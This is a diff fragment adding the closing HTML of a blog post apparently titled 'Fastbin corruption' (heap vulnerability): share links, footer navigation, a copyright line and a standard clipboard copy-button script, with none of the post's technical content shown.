+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&title=堆漏洞之--Fastbin corruption"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&name=堆漏洞之--Fastbin corruption&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/29/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8B-Fastbin-corruption/&t=堆漏洞之--Fastbin corruption"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/projects_url">Projectes</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
